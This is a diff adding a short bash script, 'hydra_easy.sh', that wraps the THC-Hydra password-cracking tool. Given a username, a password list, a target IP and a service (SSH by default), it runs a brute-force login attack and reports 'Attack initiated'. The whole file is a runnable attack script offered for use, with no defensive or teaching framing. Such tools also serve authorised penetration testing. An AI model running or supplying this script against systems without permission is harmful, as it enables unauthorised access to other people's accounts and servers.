@@ -1,0 +1,25 @@
+#!/bin/bash
+
+# Basic usage function
+function show_help {
+    echo "Usage: ./hydra_easy.sh <username> <passwords_file> <target_ip> [service]"
+    echo "Example: ./hydra_easy.sh admin passwords.txt 192.168.1.1 ssh"
+    exit 1
+}
+
+# Check for required arguments
+if [ "$#" -lt 3 ]; then
+    show_help
+fi
+
+# Assign input parameters
+username=$1
+passwords_file=$2
+target_ip=$3
+service=${4:-ssh}  # Default to SSH if no service is specified
+
+# Run THC-Hydra with provided arguments
+hydra -l "$username" -P "$passwords_file" "$target_ip" "$service"
+
+# Notify the user about the attack initiation
+echo "Attack initiated on $target_ip with username '$username' using service '$service'."
